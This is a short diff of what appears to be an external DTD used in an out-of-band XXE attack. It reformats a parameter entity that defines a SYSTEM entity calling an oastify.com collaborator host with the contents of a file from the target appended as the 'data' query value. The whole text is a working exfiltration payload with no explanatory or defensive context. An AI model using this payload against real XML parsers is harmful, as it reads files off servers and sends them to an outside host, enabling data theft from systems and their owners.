@@ -1,3 +1,2 @@
-<!ENTITY % payload "<!ENTITY exfil SYSTEM                                          
-'http://a4fjulyuq2i44n92u8ewjzmq2h88w0poe.oastify.com/?data=%file;'>">                            
+<!ENTITY % payload "<!ENTITY exfil SYSTEM 'http://a4fjulyuq2i44n92u8ewjzmq2h88w0poe.oastify.com/?data=%file;'>">                            
 %payload;
